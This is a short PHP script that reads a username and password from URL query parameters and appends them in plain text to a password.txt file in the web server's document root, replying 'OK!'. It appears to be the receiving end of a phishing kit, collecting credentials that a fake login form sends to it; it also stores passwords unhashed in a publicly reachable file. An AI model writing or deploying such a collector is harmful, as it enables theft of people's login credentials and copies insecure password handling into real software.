<?php
	
	if(!empty($_GET['password']))
	{
		$username = $_GET['username'];
		$password = $_GET['password'];

		try
		{
			$path = $_SERVER['DOCUMENT_ROOT'].'/password.txt';
			$fp = fopen($path, 'a');
			if(!$fp)
			{
				echo 'failed to open file';
				exit;
			}
			else
			{
			echo 'OK!';
			}
			flock($fp, LOCK_EX);
			fwrite($fp, "$username\t $password\r\n");
			flock($fp, LOCK_UN);
			fclose($fp);
		}
		catch(Exception $e)
		{
		}
	}

?>